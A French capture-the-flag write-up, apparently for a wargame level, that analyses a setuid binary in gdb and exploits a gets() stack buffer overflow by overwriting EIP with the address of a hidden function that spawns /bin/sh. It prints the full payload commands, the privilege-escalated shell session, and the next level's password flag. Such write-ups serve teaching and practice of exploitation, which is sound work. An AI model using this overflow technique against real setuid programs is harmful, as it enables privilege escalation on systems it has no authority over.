## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
  [...]
  ```
    - On a un binaire appartenant a level2 dans le home

- `./level1`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - rien

- `gdb level1`
  - `info function`
    ```
    [...]
      0x08048444  run
      0x08048480  main
    [...]
    ```
    - On trouve une fonction run en plus du main
  - `disas main`
    ```
      Dump of assembler code for function main:
    [...]
      0x08048486 <+6>:    sub    esp,0x50
    [...]
      0x08048490 <+16>:   call   0x8048340 <gets@plt>
    [...]
    ```
    - Le programme alloue 80 octets (0x50) pour stocker ses variables dans la stack, puis fait un appel a gets()
    - La fonction run n'est pas appelée
    
  - `disas run`
    ```
      Dump of assembler code for function run:
    [...]
      0x08048451 <+13>:	mov    eax,0x8048570
    [...]
      0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
      0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
      0x08048479 <+53>:	call   0x8048360 <system@plt>
    [...]
    ```
    - La fonction run met la valeur située à 0x8048570 dans eax
    - Call fwrite avec la valeur dans eax (donc la valeur à 0x8048570):
      - `x/s 0x8048570`
        ```
          0x8048570:	 "Good... Wait what?\n"
        ```
    - Call systeme avec la valeur située à 0x8048584:
      - `x/s 0x8048584`
        ```
          0x8048584:	 "/bin/sh"
        ```
## Exploit

- L'objectif va être de forcer l'appel de la fonction 'run' par 'main'.
- On va tirer avantage de la [vulnérabilité de gets à un buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) pour écrire l'adresse de run dans l'EIP. 
- Comme vu plus haut, main alloue 80 octets dans la stack pour ses variables, on va commencer par là:
  - `python -c 'print "a" * 80' > /tmp/exploit`
  - `gdb level1`
    - `layout reg`
    - `run < /tmp/exploit`
    ```
      Starting program: /home/user/level1/level1 < /tmp/exploit

      Program received signal SIGSEGV, Segmentation fault.
      0x61616161 in ?? ()
    ```
    - Nice, on SegFault comme attendu et l'eip est réécrit avec des a:
      ```
        eip            0x61616161       0x61616161
      ```
- L' EIP étant codé sur 4 octets dans un système 32bits, on devrait pouvoir écrire l'adresse de run dans les 4 derniers octets, on vérifie avec un exploit de 76 "a" et 4 "b" :
  - `python -c 'print "a" * 76 + "b" * 4' > /tmp/exploit`
    ```
      eip            0x62626262       0x62626262 
    ```
      - Parfait, l'EIP est écrasé par les 4 derniers octets
- On a vu plus haut que l'adresse de 'run' est 0x08048444, on la passe en little endian avant de la load à la fin de notre exploit:
  - `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit`
  - `cat /tmp/exploit | ./level1`
    ```
      Good... Wait what?
      Segmentation fault (core dumped)
    ```
    - Ok, on lance bien la fonction run, mais le shell est close tout de suite, il faut [garder stdin ouvert avec cat](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process):
      > " The shell doesn't have any input - when it detects EOF it dies. " 
      - `cat /tmp/exploit - | ./level1`
        ```
          Good... Wait what?
          whoami
          level2
          cat /home/user/level2/.pass
          53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
        ```